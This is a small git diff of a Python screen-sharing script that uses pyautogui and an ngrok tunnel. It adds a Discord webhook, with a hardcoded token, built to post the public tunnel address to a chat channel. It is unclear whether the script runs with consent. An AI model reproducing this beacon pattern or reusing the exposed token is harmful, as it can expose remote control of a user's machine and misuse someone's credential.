@@ -6,6 +6,7 @@ import os
 import pyautogui
 from PIL import Image 
 from pyngrok import ngrok # type: ignore
+from discord_webhook import DiscordWebhook
 
 path_to_cursor_folder = (os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cursor',))
 path_to_cursor = (os.path.join(path_to_cursor_folder, 'cursor.png',))
@@ -105,6 +106,6 @@ if __name__ == '__main__':
 
     public_url = ngrok.connect(5000)
     print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
-
+    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1277325619482591334/odNBwGAG9rfzNwPy2G2YDFlHusg_bfdKwhEvwnd79MdXspdGzg1b3wzZ1Bc2U9cmJiiq", content=" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
     socketio.run(app, debug=False)
     time.sleep(3)
